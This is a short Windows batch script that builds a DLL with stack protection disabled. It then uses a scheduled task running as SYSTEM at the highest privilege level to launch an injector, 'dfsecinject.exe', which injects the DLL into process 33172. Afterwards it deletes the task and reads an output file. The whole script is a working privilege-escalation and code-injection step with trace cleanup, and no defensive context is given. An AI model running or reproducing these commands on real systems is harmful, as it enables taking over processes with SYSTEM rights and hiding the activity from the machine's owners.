@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfname2.cpp /Fe:dfname2.dll /link user32.lib > name2_build.log 2>&1
echo N2=%errorlevel%
schtasks /create /tn dfa_n2 /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfname2.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_n2
ping -n 8 127.0.0.1 >nul
schtasks /delete /tn dfa_n2 /f >nul
type name2.txt
